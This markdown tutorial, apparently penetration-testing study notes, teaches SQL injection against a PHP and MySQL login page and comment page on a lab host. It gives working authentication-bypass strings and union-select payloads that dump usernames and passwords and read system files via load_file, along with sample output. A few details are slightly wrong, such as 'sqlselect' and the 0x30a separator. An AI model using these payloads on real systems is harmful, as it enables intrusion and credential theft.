SQL Injection Basics
================================================================================


## Bypassing Authentication

### Summary 

This technique uses crafted username and password input in order to get the SQL engine to reach a True condition during a database query, whether it truly found a match or not. Note that this might allow you onto the system, but you wouldn't necessarily have any permissions unless you were able to authenticate as an actual user. This technique frequently requires a good deal of experimentation before striking gold since you aren't often privy to the source code of the page containing the PHP function that queries the SQL database. The example below illustrates a common conditional statement that would derail initial authentication bypass attempts.

### Scenario

Your target is a machine running a standard LAMP stack with MySQL as the database engine. (Syntax varies in small ways among different SQL implementations, but the concept is the same across them all.)

You're presented with an authentication page. Conceptually, you know that when you click the "LOG IN" button, a PHP function will check your user input against the SQL database via at least one SQL command. Your input will be stored in variables. If your input isn't sanitized at any point between Apache and MySQL, you can put SQL syntax into your input, hope-fully getting MySQL to interpret it as syntax and not string values.

A typical, basic SQL command that would be run in MySQL is:

```
select * from users where name = '$user' and password = '$pass';
```

An unsanitized PHP function might look something like this:

```
mysql_select_db('webappdb');
$user = $_POST['user'];   //<-- unsanitized!
$pass = $_POST['pass'];   //<-- unsanitized!
$query="select * from users where name = '$user' and password = '$pass' ";
$queryN = mysql_query($query) or die(mysql_error());
...
```

The function sends a SQL query to the applicable MySQL database and gets returned the set of rows for which the query is True. It's easy to see that the variable `$user` gets whatever is typed into the `username` field and that this value is inserted inside single quotes in the portion of the SQL query `where name = '$user'`.

### Exploit

Below is a malicious username string that would get us 90% of the way to authentication bypass:

```
anywordhere' or 1=1;#
```

And you can use any password. When supplied in the `username` field, `anywordhere' or 1=1;#` becomes the `user` parameter that PHP assigns to the `$user` variable.

The query passed to MySQL is:

```
sqlselect * from users where name = 'anywordhere' or 1=1;# and password = 'doesntmatter';
```

MySQL looks in the table `users` for any rows where the value `name` matches `'anywordhere'` **or for any rows where 1 equals 1**. Since 1 always equals 1, **all** rows return as true. The semicolon terminates the command, and the rest of the SQL query is irrelevant.

We aren't out of the water yet, though. Unless we read the source code, we wouldn't be able to know that further down in the PHP function named `mysql_select_db` is a line that checks to make sure that one and only one row is returned. If fewer or more than 1 row is returned, the function does not complete authentication and create a session. The fix for this is to add an option to the SQL query that tells MySQL to return only one result. 

Revised username string for this authentication bypass SQL injection exploit:

```
anywordhere' or 1=1 LIMIT 1;#
```

<br>

## Database Enumeration & Data Dump

### Summary

Manual execution of SQL Ninja initial actions. Relies on abusing SQL query statements to generate informative error messages printed to the page during loading. Find an unsanitized parameter in a PHP page that makes SQL queries.

### Scenario

Target runs a LAMP stack. Exploit a PHP page with this vulnerable code:

```
$id = $_GET['id'];   // <-- This is the unsanitized parameter
...
$q = "SELECT * FROM $tbl_name where id = ".$id;
```

The page itself is meant for viewing a comment selected by `id`. The URL upon loading the comment-viewing page is `http://10.11.5.14/comment.php?id=767`.

### Exploit

#### [1] Test for unvalidated and unsanitized parameter

Add a single quote or a double quote to the end of the id field, which introduces an unexpected character to MySQL. If the page’s submit function is a GET request, then enter it manually in the URL bar of your browser. (If the page uses a POST request, use Tamper Data or Burp Suite to intercept and modify the request.) You might have to try several parameters.

```
http://10.11.5.14/comment.php?id=767'
```

The verbose error output when the id parameter is unsanitized and unvalidated is similar to:

```
Debug output: SELECT * FROM guestbook where id = 767’
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
```

#### [2] Enumerate column numbers

Depends on the verbosity of the web application. Attempt to gather information about database structure by using the `order by X` output query, where `X` begins with 1. Increase by 1 until an error is thrown.

```
10.11.5.14/comment.php?id=767 order by 1
10.11.5.14/comment.php?id=767 order by 2
10.11.5.14/comment.php?id=767 order by 3
...
```

Keep incrementing `X` by 1 until an error is thrown:

```
Debug output: SELECT * FROM guestbook where id = 767 order by 7
Unknown column '7' in 'order clause’
```

Now you know that the current table in use has exactly 6 (or `X-1`) columns.

#### [3] Learn table and output layout

Our next step is to figure out where table data is displayed on the page so we can fill the best output field with our extracted data. We use the "union all select" statement for this, and that statement relies on knowing exactly how many columns exist in the table. First we have to understand where the affected page shows the output of our queries:

```
10.11.5.14/comment.php?id=767 union all select 1,2,3,4,5,6
```

which shows this output:

```
Debug output: SELECT * FROM guestbook where id = 767 union all select 1,2,3,4,5,6
ID     Lang     Name     Comment
767    en       Tim      Crappy comment text
1      2        3        5
```

Based on that output, we should use column 5 for our output since it supports the most text. 

#### [4] Version of MySQL in use

```
http://10.11.5.14/comment.php?id=767 union all select 1,2,3,4,@@version,6
```

Outputs

```
    ID     Lang     Name     Comment
    767    en       Tim      Crappy comment text
    1      2        3        5.1.30-community
```

#### [5] Current user for database connection

```
10.11.5.14/comment.php?id=767 union all select 1,2,3,4,user(),6
```

Outputs

```
    ID     Lang     Name     Comment
    767    en       Tim      Crappy comment text
    1      2        3        root@localhost
```

#### [6] List all tables in database

```
10.11.5.14/comment.php?id=767 union all select 1,2,3,4,table_name,6 FROM information_schema.tables
```

Outputs

```
    ID     Lang     Name     Comment
    767    en       Tim      Crappy comment text
    1      2        3        CHARACTER_SETS
    1      2        3        COLLATIONS
    ...(Truncated for space)...
    1      2        3        user
    ...(Truncated for space)...
    1      2        3        users
    1      2        3        user_pwd
```

#### [7] Display column names from a table

The `users` table looks most promising to reveal good info, so we start there.

```
http://10.11.5.14/comment.php?id=767 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name = 'users'
```

Outputs

```
    ID     Lang     Name     Comment
    767    en       Tim      Crappy comment text
    1      2        3        id
    1      2        3        name
    1      2        3        password
    1      2        3        country
```

#### [8] Display select columns for all rows in a table

Obviously, we would select the `name` and `password` columns.

```
10.11.5.14/comment.php?id=767 union all select 1,2,3,4,concat(name,0x30a,password),6 from users
```

Outputs

```
    ID     Lang     Name     Comment
    767    en       Tim      Crappy comment text
    1      2        3        joe baseball123
    1      2        3        steve letmein
    1      2        3        sue password1
```

#### [9] Use MySQL to load and display files from the operating system

Try to read the hosts file using the MySQL load_file function:

```
http://10.11.5.14/comment.php?id=767 union all select 1,2,3,4,load_file('c:/windows/system32/drivers/etc/hosts'),6
```

Outputs

```
    ID     Lang     Name     Comment
    767    en       Tim      Crappy comment text
    1      2        3        # Copyright (c) 1993-2009 Microsoft Corp. 
# 
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows. 
# 
# This file contains the mappings of IP addresses to host names. Each 
# entry should be kept on an individual line. The IP address should 
# be placed in the first column followed by the corresponding host name. 
# The IP address and the host name should be separated by at least one # space. 
# 
# Additionally, comments (such as these) may be inserted on individual 
# lines or following the machine name denoted by a '#' symbol. 
# 
# For example: 
# 
# 102.54.94.97 rhino.acme.com 
# source server 
# 38.25.63.10 x.acme.com 
# x client host 
# localhost name resolution is handled within DNS itself. 
# 127.0.0.1 localhost 
# ::1 localhost
```

<br>
